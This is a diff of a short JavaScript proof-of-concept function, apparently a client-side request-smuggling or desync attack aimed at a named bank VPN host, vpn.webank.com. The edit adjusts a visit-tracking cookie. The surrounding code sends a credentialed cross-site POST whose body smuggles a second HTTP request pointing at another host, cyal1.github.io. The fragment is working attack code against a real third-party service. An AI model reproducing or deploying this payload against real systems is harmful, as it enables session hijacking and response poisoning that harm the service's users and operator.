@@ -32,10 +32,10 @@ function poc(){
 		alert("你已经访问过此页面了");
 		location='https://vpn.webank.com/';
 	}else{
-		today =  new Date();
-		expiress = new Date();
-		expiress.setTime(today.getTime()+ 1000*60*60*72);
-		document.cookie="isvisted=true; expiress="+expiress.toGMTString();
+		// today =  new Date();
+		// expiress = new Date();
+		// expiress.setTime(today.getTime()+ 1000*60*60*72);
+		document.cookie="isvisted=true; max-age="+60*3+";";
 		fetch("https://vpn.webank.com/");
 		fetch('https://vpn.webank.com/',
 		 {method: 'POST', body: "GET /+webvpn+/ HTTP/1.1\r\nHost: cyal1.github.io\r\nX: Y", credentials: 'include'}).catch(() => {
